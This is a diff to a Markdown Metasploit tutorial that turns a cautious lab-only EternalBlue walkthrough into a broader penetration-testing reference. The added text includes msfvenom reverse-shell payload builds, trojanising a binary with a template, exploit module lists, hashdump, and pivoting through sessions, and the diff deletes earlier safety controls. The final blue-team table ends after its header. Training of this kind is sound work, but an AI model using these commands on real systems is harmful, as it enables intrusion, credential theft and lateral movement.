@@ -1,631 +1,551 @@
-# The Complete Metasploit Guide (2026 Edition)
+# Metasploit Framework
 
 A structured guide to the Metasploit Framework, covering safe lab setup, module selection, vulnerability verification, session management, database-backed workflows, reporting, and a guided EternalBlue simulation based on an authorised TryHackMe-style environment.
 
 > [!CAUTION]
-> **Legal and ethical use only.** Use Metasploit only against systems you own, systems for which you have explicit written authorisation, or deliberately vulnerable training environments such as TryHackMe, Hack The Box, or an isolated local virtual lab. Never test public, university, workplace, or third-party systems without written permission.
-
-> [!IMPORTANT]
-> The EternalBlue exercise below is intended only for an intentionally vulnerable training machine. Use the target address assigned by your lab platform. Do not substitute a public or organisational IP address.
+> **Authorised use only.** Run Metasploit against systems you own, systems you hold explicit written permission to test, or deliberately vulnerable labs (TryHackMe, Hack The Box, Metasploitable, local host-only VMs). Testing third-party, public, workplace, or institutional systems without a signed scope is illegal. Nothing here changes that.
 
 ---
 
 ## Table of Contents
 
-1. [Lab Safety and Scope](#lab-safety-and-scope)
-2. [Metasploit Architecture](#metasploit-architecture)
-3. [Starting Metasploit](#starting-metasploit)
-4. [Core Commands](#core-commands)
-5. [Searching and Selecting Modules](#searching-and-selecting-modules)
-6. [Understanding Module Options](#understanding-module-options)
-7. [Guided Lab: MS17-010 and EternalBlue](#guided-lab-ms17-010-and-eternalblue)
-8. [Session Management](#session-management)
-9. [Database Integration and Workspaces](#database-integration-and-workspaces)
-10. [Resource Scripts and Logging](#resource-scripts-and-logging)
-11. [Auxiliary and Post Modules](#auxiliary-and-post-modules)
-12. [Payload Concepts](#payload-concepts)
-13. [Pivoting Concepts](#pivoting-concepts)
-14. [Further Learning](#further-learning)
+**Part I — Foundations**
+- [1.1 When to reach for Metasploit](#11-when-to-reach-for-metasploit)
+- [1.2 Architecture & terminology](#12-architecture--terminology)
+- [1.3 The engagement at a glance](#13-the-engagement-at-a-glance)
+- [1.4 Environment setup](#14-environment-setup)
+- [1.5 Console workflow](#15-console-workflow)
+
+**Part II — Discovery & Scanning**
+- [2.1 Module discovery](#21-module-discovery)
+- [2.2 Module evaluation checklist](#22-module-evaluation-checklist)
+- [2.3 Options & the datastore](#23-options--the-datastore)
+- [2.4 Workspaces & database](#24-workspaces--database)
+- [2.5 Windows scanning & enumeration](#25-windows-scanning--enumeration)
+- [2.6 Linux scanning & enumeration](#26-linux-scanning--enumeration)
+
+**Part III — Exploitation**
+- [3.1 Payloads explained](#31-payloads-explained)
+- [3.2 MSFvenom](#32-msfvenom)
+- [3.3 Handlers](#33-handlers)
+- [3.4 Worked example: EternalBlue (Windows)](#34-worked-example-eternalblue-windows)
+- [3.5 More Windows exploits](#35-more-windows-exploits)
+- [3.6 Linux exploitation examples](#36-linux-exploitation-examples)
+
+**Part IV — Post-Exploitation & Movement**
+- [4.1 Meterpreter reference](#41-meterpreter-reference)
+- [4.2 Post-exploitation](#42-post-exploitation)
+- [4.3 Pivoting & routing](#43-pivoting--routing)
+- [4.4 Session management](#44-session-management)
+
+**Part V — Automation, Evasion & Reporting**
+- [5.1 Automation & the RPC API](#51-automation--the-rpc-api)
+- [5.2 Evasion: what actually matters](#52-evasion-what-actually-matters)
+- [5.3 Logging, evidence & reporting](#53-logging-evidence--reporting)
+- [5.4 Blue-team mapping](#54-blue-team-mapping)
+- [5.5 Troubleshooting](#55-troubleshooting)
+- [5.6 References](#56-references)
 
 ---
 
-## Lab Safety and Scope
+# Part I — Foundations
 
-Before starting, record the following information:
+## 1.1 When to reach for Metasploit
 
-```text
-Lab platform:        TryHackMe / local isolated lab
-Authorised target:   <LAB_TARGET_IP>
-Attacker address:    <LAB_ATTACKER_IP>
-Permitted ports:     As stated by the lab
-Start time:          <DATE_AND_TIME>
-End time:            <DATE_AND_TIME>
-Rules of engagement: Training activity only
-```
+- **Verification** — confirm a vulnerability is actually exploitable, not just scanner-reported.
+- **Access** — gain an authorised foothold to demonstrate impact.
+- **Post-exploitation** — enumerate, escalate, pivot within agreed scope.
+- **Not** a replacement for manual testing or understanding *why* something works. Tooling, not a crutch.
 
-### Required safety controls
-
-- Use the TryHackMe AttackBox, VPN-assigned room target, or an isolated host-only virtual network.
-- Take snapshots of local virtual machines before testing.
-- Do not use bridged networking for a deliberately vulnerable host.
-- Do not scan adjacent addresses unless the lab explicitly includes them.
-- Stop if the observed system does not match the authorised target.
-- Keep evidence, commands, and findings inside the approved coursework or lab record.
-
----
-
-## Metasploit Architecture
+## 1.2 Architecture & terminology
 
 | Component | Purpose |
 |---|---|
-| Exploit | Targets a specific vulnerability or unsafe condition. |
-| Auxiliary module | Performs scanning, enumeration, verification, or supporting tasks. |
-| Payload | Defines the action requested after a successful exploit. |
-| Post module | Performs an authorised action against an existing session. |
-| Encoder | Transforms payload bytes for compatibility; it is not a guarantee of detection avoidance. |
-| Session | Represents an established interaction channel. |
-| Job | A module running in the background. |
-| Workspace | Separates hosts, services, findings, notes, and evidence by engagement. |
+| Exploit | Leverages a specific flaw or unsafe condition. |
+| Auxiliary | Scanning, enumeration, fuzzing, brute-force — no payload needed. |
+| Payload | What runs post-exploitation (shell, Meterpreter, command). |
+| Encoder | Byte transform for compatibility/bad-chars — **not** reliable AV evasion. |
+| Post | Actions run against an existing session. |
+| Session | Established interaction channel (shell or Meterpreter). |
+| Job | A module/handler running in the background. |
+| Workspace | Per-engagement separation of hosts, services, loot, evidence. |
 
-### Important terms
+**Key datastore options:** `RHOSTS` (target), `RPORT` (port), `LHOST` (your callback NIC/VPN), `LPORT` (listener), `SESSION` (post target), `PAYLOAD` / `TARGET`.
 
-- **RHOSTS:** The authorised remote target or target range.
-- **RPORT:** The service port on the remote host.
-- **LHOST:** The local interface used for a lab callback.
-- **LPORT:** The local listener port.
-- **SESSION:** The identifier of an existing shell or Meterpreter session.
+## 1.3 The engagement at a glance
 
----
-
-## Starting Metasploit
-
-### 1. Confirm the framework version
-
-```bash
-msfconsole --version
+```mermaid
+flowchart LR
+    A[Scope & authorise] --> B[Recon / scan]
+    B --> C[Enumerate services]
+    C --> D[Verify vuln]
+    D --> E[Exploit]
+    E --> F[Session]
+    F --> G[Post-exploit: enum / privesc]
+    G --> H[Pivot to internal]
+    H --> C
+    G --> I[Evidence & report]
+    I --> J[Cleanup]
 ```
 
-### 2. Initialise the database once
+How the core objects relate:
 
-```bash
-sudo msfdb init
+```mermaid
+flowchart TD
+    EX[Exploit module] -->|delivers| PL[Payload]
+    AUX[Auxiliary module] -->|scans / verifies| TGT[(Target)]
+    EX -->|targets| TGT
+    PL -->|opens| SESS[Session]
+    SESS -->|acted on by| POST[Post module]
+    SESS -->|routes through| PIV[Pivot / autoroute]
+    DB[(Workspace DB)] --- AUX
+    DB --- SESS
 ```
 
-### 3. Start the console
+## 1.4 Environment setup
 
 ```bash
-msfconsole
+msfconsole --version          # confirm build
+sudo msfdb init               # one-time: provision PostgreSQL + msf db
+msfconsole -q                 # start quietly
 ```
-
-### 4. Confirm database connectivity
 
 ```text
-db_status
+db_status                     # confirm DB connection
+db_rebuild_cache              # refresh search index if stale
 ```
 
-A connected database allows Metasploit to organise hosts, services, vulnerabilities, credentials, loot, sessions, and routes inside workspaces.
+- A connected DB makes hosts/services/vulns/creds/loot queryable.
+- Keep updated: `apt update && apt install metasploit-framework`, or `git pull` on source installs.
 
----
-
-## Core Commands
+## 1.5 Console workflow
 
 ```text
-help                   Display available commands
-version                Show the framework version
-search <keyword>       Search for modules
-use <module>           Load a module
-info                   Show module details and references
-show options           Display required and optional settings
-show payloads          List compatible payloads
-show targets           List supported target profiles
-set <option> <value>   Set a module option
-unset <option>         Remove a module option
-setg <option> <value>  Set a global option
-unsetg <option>        Remove a global option
-check                  Run the module's non-destructive check, if supported
-run                    Execute an auxiliary or post module
-exploit                Execute an exploit module
-back                   Leave the current module
-exit                   Close msfconsole
+search <filter>   find modules     info           module detail + refs
+use <module>      load             show options   required/optional fields
+show payloads     compatible       show targets   target profiles
+set / setg        set option       unset / unsetg clear option
+check             non-destructive check (if any)
+run / exploit     execute          run -j         execute as background job
+back / sessions   leave / list     jobs -K        kill all jobs
 ```
 
-> [!NOTE]
-> Not every exploit supports `check`. Read `info`, review side effects, and confirm that the operating system, architecture, service, patch level, and module target are appropriate.
+- `use 0` selects the first search hit. `setg LHOST tun0` once saves repetition.
+- `grep <str> show options` filters long output.
 
 ---
 
-## Searching and Selecting Modules
+# Part II — Discovery & Scanning
 
-Metasploit search filters help narrow a large module collection.
+## 2.1 Module discovery
 
 ```text
 search name:eternalblue
 search cve:2017-0144
-search type:exploit platform:windows smb
-search type:auxiliary platform:windows smb
-search rank:excellent platform:windows type:exploit
+search type:exploit platform:windows smb rank:excellent
+search type:auxiliary platform:linux ssh
 ```
 
-| Filter | Example |
+| Filter | Values |
 |---|---|
-| `type:` | `exploit`, `auxiliary`, `post`, `payload` |
-| `platform:` | `windows`, `linux`, `unix`, `osx`, `android` |
-| `cve:` | `cve:2017-0144` |
-| `name:` | `name:eternalblue` |
-| `author:` | Search by module author |
-| `rank:` | `excellent`, `great`, `good`, `normal`, `average`, `low`, `manual` |
+| `type:` | exploit, auxiliary, post, payload, encoder |
+| `platform:` | windows, linux, unix, osx, android, php, multi |
+| `rank:` | excellent, great, good, normal, average, low, manual |
+| `cve:` / `name:` / `author:` / `path:` | targeted lookups |
 
-### Module review checklist
+- Prefer `excellent`/`great` ranks, but confirm with `info` before trusting.
 
-Before running any module:
+## 2.2 Module evaluation checklist
 
-1. Read `info`.
-2. Confirm affected products and versions.
-3. Review module references and notes.
-4. Check the module rank and listed side effects.
-5. Confirm architecture and target profile.
-6. Run `show options` and resolve every required field.
-7. Use `check` if the module supports it.
-8. Test against a clone or training image before using it in a formal engagement.
+- `info` — affected products, versions, references, side effects.
+- Confirm arch/OS/service/patch level actually match the target.
+- Check `rank` + DoS/stability warnings.
+- `show targets` — pick the correct profile; "Automatic" can misfire.
+- `check` if supported; else verify out-of-band (Nmap NSE).
+- Memory-corruption exploits = crash risk. Snapshot first.
 
----
-
-## Understanding Module Options
-
-After loading a module, run:
+## 2.3 Options & the datastore
 
 ```text
-show options
+show options / show advanced
+set RHOSTS 10.10.10.0/24
+set RHOSTS file:/path/targets.txt
+setg LHOST tun0
+set AutoRunScript post/windows/manage/migrate
 ```
 
-Common fields include:
+- Accepts CIDR, ranges (`10.10.10.1-20`), and `file:` lists for `RHOSTS`.
+- `hosts -R` / `services -p <port> -R` set `RHOSTS` straight from the DB.
+
+## 2.4 Workspaces & database
 
 ```text
-RHOSTS   Authorised remote target
-RPORT    Remote service port
-LHOST    Local callback interface
-LPORT    Local listener port
-PAYLOAD  Action used after successful exploitation
-TARGET   Operating-system or application profile
-SESSION  Existing session used by a post module
+workspace -a client_x          # per-engagement separation
+db_nmap -sV -sC -Pn <TARGET>   # scan into the DB
+hosts / services / vulns       # query
+creds / loot / notes           # harvested data
+db_import scan.xml             # ingest nmap -oX
+db_export -f xml export.xml    # back up
 ```
 
-To identify the correct lab interface, use the interface provided by the platform. For TryHackMe, this is usually the AttackBox interface or the VPN tunnel address, not a public Wi-Fi address.
+- One workspace per client/lab keeps evidence from bleeding across engagements.
+- `analyze` suggests modules for discovered hosts.
 
----
+## 2.5 Windows scanning & enumeration
 
-# Guided Lab: MS17-010 and EternalBlue
-
-## Scenario
-
-You are assessing an intentionally vulnerable Windows training machine in an isolated lab. The objective is to identify SMB exposure, verify MS17-010, understand the Metasploit workflow, establish a training session, and recommend defensive controls.
-
-### Lab variables
-
-Replace only the placeholders supplied by your authorised platform:
+**SMB (TCP 139/445)** — the Windows workhorse.
 
 ```text
-LAB_TARGET_IP=<assigned target address>
-LAB_ATTACKER_IP=<AttackBox or VPN address>
+use auxiliary/scanner/smb/smb_version        # OS build / SMB dialect
+use auxiliary/scanner/smb/smb_ms17_010       # EternalBlue check
+use auxiliary/scanner/smb/smb_enumshares     # shares (null / cred)
+use auxiliary/scanner/smb/smb_enumusers      # user accounts
+use auxiliary/scanner/smb/smb_login          # credential spray (authorised!)
+set RHOSTS 10.10.10.0/24 ; run
 ```
 
-Do not copy the IP addresses shown in public walkthroughs, because each lab instance may assign different addresses.
-
----
-
-## Task 1: Start the target and confirm scope
-
-1. Start the TryHackMe Blue target or your instructor-provided vulnerable VM.
-2. Record the assigned target IP address.
-3. Confirm that your attacker machine is connected to the same authorised lab environment.
-4. Record the room name, date, and start time.
-
-**Checkpoint:** You should have one authorised target address and one attacker address.
-
----
-
-## Task 2: Perform controlled reconnaissance
-
-Use a service and default-script scan against the single authorised host:
-
-```bash
-nmap -sV -sC -Pn <LAB_TARGET_IP>
-```
-
-Look for the following training indicators:
-
-- TCP port `445` is open.
-- SMB or Microsoft-DS is identified.
-- The system resembles an older Windows host.
-
-### Interpretation
-
-An open port confirms only that a service is reachable. It does not prove that MS17-010 is present. A vulnerability-specific check is still required.
-
-**Evidence to capture:** The command, target address, relevant open ports, detected services, and scan time.
-
----
-
-## Task 3: Verify MS17-010 safely
-
-Use the Nmap vulnerability-checking script against port 445:
-
-```bash
-nmap -p 445 --script smb-vuln-ms17-010 <LAB_TARGET_IP>
-```
-
-Alternatively, use Metasploit's SMB checker:
+**Other common Windows services:**
 
 ```text
-msfconsole
-search name:smb_ms17_010
-use auxiliary/scanner/smb/smb_ms17_010
-show options
-set RHOSTS <LAB_TARGET_IP>
+# RDP (3389)
+use auxiliary/scanner/rdp/rdp_scanner
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep   # check only, see 3.5
+
+# WinRM (5985/5986)
+use auxiliary/scanner/winrm/winrm_auth_methods
+use auxiliary/scanner/winrm/winrm_login
+
+# MSSQL (1433)
+use auxiliary/scanner/mssql/mssql_ping
+use auxiliary/scanner/mssql/mssql_login
+
+# SMTP / NetBIOS / LDAP
+use auxiliary/scanner/netbios/nbname
+use auxiliary/gather/ldap_query
+```
+
+- Start with `smb_version` → it fingerprints OS build and tells you which exploits are even plausible.
+- `smb_login` / `*_login` = credential testing. Only with authorisation and agreed lockout limits.
+
+## 2.6 Linux scanning & enumeration
+
+Classic service sweep (great against Metasploitable / HTB Linux boxes):
+
+```text
+# SSH (22)
+use auxiliary/scanner/ssh/ssh_version
+use auxiliary/scanner/ssh/ssh_login            # cred test (authorised)
+use auxiliary/scanner/ssh/ssh_enumusers
+
+# FTP (21)
+use auxiliary/scanner/ftp/ftp_version
+use auxiliary/scanner/ftp/anonymous            # anon login check
+
+# SMB / Samba (139/445)
+use auxiliary/scanner/smb/smb_version          # also IDs Samba on Linux
+
+# NFS (2049)
+use auxiliary/scanner/nfs/nfsmount             # exported shares
+
+# Web / misc
+use auxiliary/scanner/http/http_version
+use auxiliary/scanner/http/dir_scanner
+```
+
+```text
+set RHOSTS 10.10.10.5
 run
 ```
 
-### Expected training result
-
-The intentionally vulnerable lab should report that the host is likely vulnerable. If the result is negative or uncertain:
-
-- Reconfirm the target address.
-- Confirm the target VM is fully started.
-- Check that your VPN or AttackBox connection is active.
-- Do not proceed against another address.
-
-**Checkpoint:** Record the evidence that supports or rejects the MS17-010 finding.
+- Samba shows up under the SMB scanners too — don't assume 445 means Windows.
+- Anonymous FTP + NFS exports are frequent quick wins on lab Linux hosts.
 
 ---
 
-## Task 4: Review the EternalBlue module
+# Part III — Exploitation
 
-Search for the module:
+## 3.1 Payloads explained
 
-```text
-search name:ms17_010_eternalblue
-```
-
-Load it and read its documentation:
-
-```text
-use exploit/windows/smb/ms17_010_eternalblue
-info
-show options
-show targets
-show payloads
-```
-
-Before continuing, answer:
-
-- Which operating systems and architectures are supported?
-- What port is targeted by default?
-- Does the module support `check`?
-- What side effects or stability warnings are listed?
-- Does the module match the training host?
-
----
-
-## Task 5: Configure the authorised lab target
-
-Set only the values assigned by the lab:
-
-```text
-set RHOSTS <LAB_TARGET_IP>
-set RPORT 445
-set LHOST <LAB_ATTACKER_IP>
-```
-
-Select the payload required by the training room or instructor. For a 64-bit Windows training host, a lab may specify:
-
-```text
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-```
-
-Review all settings:
-
-```text
-show options
-```
-
-Run the module check if available:
-
-```text
-check
-```
-
-### Pre-execution checklist
-
-- [ ] The target address matches the lab page.
-- [ ] Port 445 is in scope.
-- [ ] The vulnerability checker indicates MS17-010.
-- [ ] `LHOST` is the AttackBox or VPN interface.
-- [ ] The payload architecture matches the target.
-- [ ] No public or institutional addresses are included.
-
----
-
-## Task 6: Execute only in the authorised lab
-
-After completing the checklist, run:
-
-```text
-run
-```
-
-If the training exploit succeeds, Metasploit should create a session. Immediately record:
-
-- Session ID
-- Session type
-- Target address
-- Connection time
-- Module used
-
-List sessions:
-
-```text
-sessions -l
-```
-
-Interact with the assigned session:
-
-```text
-sessions -i <SESSION_ID>
-```
-
-Confirm the training context without collecting personal data:
-
-```text
-sysinfo
-getuid
-```
-
-Background the session when finished:
-
-```text
-background
-```
-
-> [!WARNING]
-> Do not enable persistence, capture keystrokes, activate cameras or microphones, collect real credentials, or access unrelated files. Those actions are unnecessary for this learning objective.
-
----
-
-## Task 7: Session management practice
-
-```text
-sessions -l                     List active sessions
-sessions -i <ID>                Interact with a session
-sessions -v                     Show detailed session information
-sessions -k <ID>                Close a specific session
-```
-
-Inside a session:
-
-```text
-background                      Return to msfconsole without closing the session
-exit                            Close the current session
-```
-
-A plain command shell can sometimes be upgraded in an authorised lab:
-
-```text
-sessions -u <SESSION_ID>
-```
-
-If the automatic upgrade is unavailable, inspect the documented post module rather than running it blindly:
-
-```text
-info post/multi/manage/shell_to_meterpreter
-```
-
----
-
-## Task 8: Record the finding
-
-Use a concise finding format:
-
-```text
-Title:       MS17-010 exposure on legacy SMB service
-Asset:       <LAB_TARGET_IP>
-Severity:    Critical in the training scenario
-Evidence:    Port 445 open and authorised checker reported likely vulnerable
-Impact:      Potential remote code execution under vulnerable conditions
-Cause:       Missing security update and legacy SMBv1 exposure
-Remediation: Apply security updates, disable SMBv1, restrict TCP/445, segment or replace legacy systems
-Validation:  Repeat the vulnerability check after remediation
-```
-
----
-
-## Task 9: End the lab safely
-
-1. Close all sessions.
-2. Stop background jobs.
-3. Stop the target VM or room instance.
-4. Save console output and screenshots.
-5. Remove any temporary lab files.
-6. Record the end time.
-
-```text
-sessions -K
-jobs -K
-spool off
-exit
-```
-
----
-
-## Session Management
-
-```text
-sessions -l                 List sessions
-sessions -v                 Show verbose details
-sessions -i <ID>            Interact with a session
-sessions -k <ID>            Close one session
-sessions -K                 Close all sessions
-sessions -u <ID>            Attempt an authorised shell upgrade
-```
-
-Metasploit also supports session search fields such as session ID, session type, and last check-in. Use `sessions -h` to review the syntax supported by your installed version.
-
----
-
-## Database Integration and Workspaces
-
-### Create a workspace
-
-```text
-workspace
-workspace -a blue_lab
-workspace blue_lab
-```
-
-### Import scan data directly
-
-```text
-db_nmap -sV -sC -Pn <LAB_TARGET_IP>
-hosts
-services
-vulns
-notes
-loot
-```
-
-### Import an existing XML scan
-
-```bash
-nmap -sV -oX blue-scan.xml <LAB_TARGET_IP>
-```
-
-```text
-db_import blue-scan.xml
-hosts
-services
-```
-
-### Export workspace data
-
-```text
-db_export -f xml blue-lab-export.xml
-```
-
-Use a separate workspace for each lab or engagement so evidence does not become mixed.
-
----
-
-## Resource Scripts and Logging
-
-### Record console output
-
-```text
-spool blue-lab-console.txt
-```
-
-Stop recording:
-
-```text
-spool off
-```
-
-### Create a safe resource script
-
-Create `blue-enumeration.rc`:
-
-```text
-workspace -a blue_lab
-use auxiliary/scanner/smb/smb_version
-set RHOSTS <LAB_TARGET_IP>
-run
-back
-hosts
-services
-```
-
-Run it with:
-
-```bash
-msfconsole -r blue-enumeration.rc
-```
-
-Resource scripts should contain only in-scope, reviewed commands. Do not hard-code real credentials or public targets.
-
----
-
-## Auxiliary and Post Modules
-
-### Auxiliary modules
-
-Auxiliary modules support scanning and verification without necessarily exploiting a target.
-
-```text
-show auxiliary
-search type:auxiliary smb
-use auxiliary/scanner/smb/smb_version
-show options
-set RHOSTS <LAB_TARGET_IP>
-run
-```
-
-### Post modules
-
-Post modules operate against an existing authorised session.
-
-```text
-search type:post platform:windows
-use post/<module>
-show options
-set SESSION <SESSION_ID>
-info
-```
-
-Review a post module's purpose, required privileges, side effects, and evidence impact before running it.
-
----
-
-## Payload Concepts
-
-### Bind and reverse payloads
-
-- A **reverse payload** asks the target to connect back to the tester's authorised listener.
-- A **bind payload** asks the target to listen for an incoming connection.
-- A **staged payload** transfers a small initial stage before loading the full payload.
-- A **stageless payload** contains the required functionality in one payload.
-
-Use only the payload specified by the lab. Do not generate standalone payload files for distribution or delivery outside the isolated environment.
-
----
-
-## Pivoting Concepts
-
-Pivoting routes authorised assessment traffic through an existing session to reach an otherwise inaccessible lab subnet. It is an advanced technique that can unintentionally broaden scope.
+**Reverse vs bind:**
 
 ```mermaid
 flowchart LR
-    A[Authorised tester] -->|Session| B[Lab jump host]
-    B -->|Approved route| C[Isolated training subnet]
+    subgraph Reverse["Reverse (target dials out — firewall-friendly)"]
+      T1[Target] -->|connects back| A1[Attacker listener]
+    end
+    subgraph Bind["Bind (target listens — needs inbound reachable)"]
+      A2[Attacker] -->|connects in| T2[Target port]
+    end
 ```
 
-Before practising pivoting:
+**Staged vs stageless:**
 
-- Obtain explicit approval for the internal subnet.
-- Record the exact CIDR range.
-- Confirm that no production network is connected.
-- Use a dedicated advanced lab.
-- Remove routes and proxies at the end.
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant T as Target
+    Note over A,T: Staged (small first, full later)
+    T->>A: stage-1 stub connects back
+    A->>T: sends full Meterpreter stage
+    Note over A,T: Stageless (one self-contained blob)
+    T->>A: full payload connects, ready immediately
+```
 
-This guide intentionally excludes an operational pivoting walkthrough. Use the official Metasploit pivoting documentation inside a purpose-built lab.
+- **Reverse** beats egress-filtered networks; **bind** suits when you can reach an open port but the host can't dial out.
+- **Staged** (`.../meterpreter/reverse_tcp`) is smaller; **stageless** (`..._reverse_tcp`) is more robust over flaky links/proxies.
+
+## 3.2 MSFvenom
+
+Standalone payload builder — authorised delivery inside scope only.
+
+```bash
+# windows
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o b.exe
+# linux
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o s.elf
+# web
+msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o s.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o s.jsp
+# shellcode (exploit dev)
+msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00\x0a\x0d'
+```
+
+- `-b` bad chars, `-e` encoder, `-i` iterations (compatibility, **not** guaranteed evasion).
+- `-x template.exe -k` embeds into a real binary and keeps it running.
+
+## 3.3 Handlers
+
+```text
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST tun0 ; set LPORT 4444
+set ExitOnSession false
+run -j
+```
+
+- `PAYLOAD`/`LHOST`/`LPORT` must match the generated payload exactly.
+- One-liner: `handler -H tun0 -P 4444 -p windows/x64/meterpreter/reverse_tcp`.
+
+## 3.4 Worked example: EternalBlue (Windows)
+
+Single end-to-end example against an **intentionally vulnerable training host** (e.g. TryHackMe *Blue*). Use the address your lab assigns.
+
+```text
+# 1. verify
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS <LAB_TARGET> ; run
+
+# 2. review before firing
+use exploit/windows/smb/ms17_010_eternalblue
+info ; show targets
+
+# 3. configure
+set RHOSTS <LAB_TARGET>
+set LHOST tun0
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+show options
+
+# 4. exploit (lab only)
+run
+sessions -i <ID>
+sysinfo ; getuid ; background
+```
+
+> [!WARNING]
+> Kernel memory-corruption exploit — it can **BSOD** the target. Snapshot first, expect to re-run, never aim it out of scope.
+
+## 3.5 More Windows exploits
+
+Reference-level — each demands `check` first, lab framing, and scope sign-off.
+
+```text
+# BlueKeep — RDP RCE (CVE-2019-0708). HIGH crash/BSOD risk; check, don't spray.
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+# SMBGhost — SMBv3 compression (CVE-2020-0796). Local/remote variants; unstable.
+use exploit/windows/smb/cve_2020_0796_smbghost
+
+# PsExec — auth'd code exec with valid creds/hashes (pass-the-hash)
+use exploit/windows/smb/psexec
+set SMBUser Administrator ; set SMBPass <pass-or-hash>
+
+# WinRM — auth'd command exec
+use exploit/windows/winrm/winrm_script_exec
+```
+
+- **PsExec** is the realistic lateral-movement path once you have creds/hashes — far more stable than memory exploits.
+- Memory-corruption RCEs (BlueKeep/SMBGhost) crash boxes readily; treat them as last resort in anything you care about.
+
+## 3.6 Linux exploitation examples
+
+Classic, well-documented lab targets (Metasploitable 2 and similar). All patched for years — purely educational.
+
+```text
+# vsftpd 2.3.4 backdoor
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <LAB_TARGET> ; run
+
+# Samba usermap_script (CVE-2007-2447)
+use exploit/multi/samba/usermap_script
+
+# UnrealIRCd 3.2.8.1 backdoor
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+
+# distcc daemon command exec
+use exploit/unix/misc/distcc_exec
+
+# Shellshock via CGI (CVE-2014-6271)
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+# ProFTPD mod_copy
+use exploit/unix/ftp/proftpd_modcopy_exec
+```
+
+- These return plain shells by default — upgrade with `sessions -u <ID>` for Meterpreter features.
+- `search platform:linux type:exploit rank:excellent` surfaces more; always `info` first.
 
 ---
 
-## Further Learning
+# Part IV — Post-Exploitation & Movement
 
-- [Official Metasploit Documentation](https://docs.metasploit.com/)
-- [Metasploit Database Support](https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html)
-- [Managing Sessions](https://docs.metasploit.com/docs/using-metasploit/basics/managing-sessions.html)
-- [How to Use a Metasploit Module Appropriately](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html)
-- [Metasploit Framework on GitHub](https://github.com/rapid7/metasploit-framework)
-- [TryHackMe Blue Room](https://tryhackme.com/room/blue)
+## 4.1 Meterpreter reference
+
+| Group | Commands |
+|---|---|
+| Core | `help`, `background`, `migrate <pid>`, `getpid`, `sessions` |
+| System | `sysinfo`, `getuid`, `getprivs`, `ps`, `shell`, `execute -f <bin>` |
+| Files | `pwd`, `ls`, `cat`, `download`, `upload`, `search -f *.kdbx` |
+| Network | `ipconfig`, `route`, `arp`, `netstat`, `portfwd` |
+| Priv (Win) | `getsystem`, `hashdump`, `load kiwi` |
+| Extend | `load python`, `load powershell`, `load kiwi` |
+
+- `migrate` into a stable, same-arch process early — a staged payload dies with its host process.
+
+## 4.2 Post-exploitation
+
+```text
+run post/multi/recon/local_exploit_suggester    # privesc candidates (Win+Linux)
+run post/windows/gather/enum_logged_on_users
+getsystem                                        # Windows privesc
+run post/multi/manage/shell_to_meterpreter       # upgrade a plain shell
+hashdump                                          # needs SYSTEM (authorised)
+```
+
+- `local_exploit_suggester` is the fastest privesc route — then **read** the suggested module before firing.
+- Credential/persistence actions carry real blast radius: confirm scope, log, revert.
+
+## 4.3 Pivoting & routing
+
+```mermaid
+flowchart LR
+    A[Attacker / MSF] -->|session| B[Foothold host<br/>dual-homed]
+    B -->|autoroute 10.10.20.0/24| C[Internal subnet]
+    C --> D[DB server]
+    C --> E[File server]
+```
+
+```text
+run autoroute -s 10.10.20.0/24          # route via session
+use auxiliary/scanner/portscan/tcp      # scan far side through pivot
+portfwd add -l 3389 -p 3389 -r 10.10.20.10
+use auxiliary/server/socks_proxy        # + proxychains for external tools
+set VERSION 5 ; run -j
+```
+
+- Routes only *hop* traffic — but newly reachable hosts must still be in scope.
+- Tear down routes (`route flush`) and proxies at engagement end.
+
+## 4.4 Session management
+
+```text
+sessions -l / -v            list / verbose
+sessions -i <ID>            interact
+sessions -k <ID> / -K       kill one / all
+sessions -u <ID>            upgrade shell -> meterpreter
+sessions -c "<cmd>" -i <ID> run command in session
+sessions -n <name> -i <ID>  label it
+```
+
+---
+
+# Part V — Automation, Evasion & Reporting
+
+## 5.1 Automation & the RPC API
+
+**Resource scripts** — batch reviewed, in-scope commands:
+
+```text
+# recon.rc
+workspace -a client_x
+db_nmap -sV -Pn 10.10.10.5
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 10.10.10.5
+run
+```
+
+```bash
+msfconsole -q -r recon.rc
+```
+
+- `<ruby>...</ruby>` blocks add logic/loops; `makerc <file>` dumps your history to a replayable script.
+- **RPC API:** `msfrpcd -U msf -P <pass> -p 55553 -S`, then drive from `pymetasploit3`. Never commit real creds/targets.
+
+## 5.2 Evasion: what actually matters
+
+- **Encoders ≠ AV bypass.** They fix bad-chars/compatibility; EDR flags the decoder stub and behaviour anyway.
+- Static sigs catch default MSF artifacts; stageless + custom templates help vs *signatures*, not *behaviour*.
+- EDR hooks API calls and memory behaviour — generic tricks lose. Honest reports document detection points instead of pretending they don't exist.
+
+## 5.3 Logging, evidence & reporting
+
+```text
+spool engagement.log   # mirror console to file
+spool off
+```
+
+- Screenshot session creation, `getuid`, key findings. `loot`/`creds`/`notes`/`db_export` are your trail.
+
+**Finding template**
+
+```text
+Title:       MS17-010 RCE (legacy SMBv1)
+Asset:       <host / IP>
+Severity:    Critical
+Evidence:    445 open; smb_ms17_010 likely-vulnerable; SYSTEM session
+Impact:      Unauthenticated RCE, full compromise, lateral movement
+Remediation: Patch MS17-010, disable SMBv1, restrict TCP/445, segment/retire
+Validation:  Re-run smb_ms17_010 post-fix
+```
+
+## 5.4 Blue-team mapping
+
+| Technique | Detection / control | ATT&CK |
+|---|---|---|
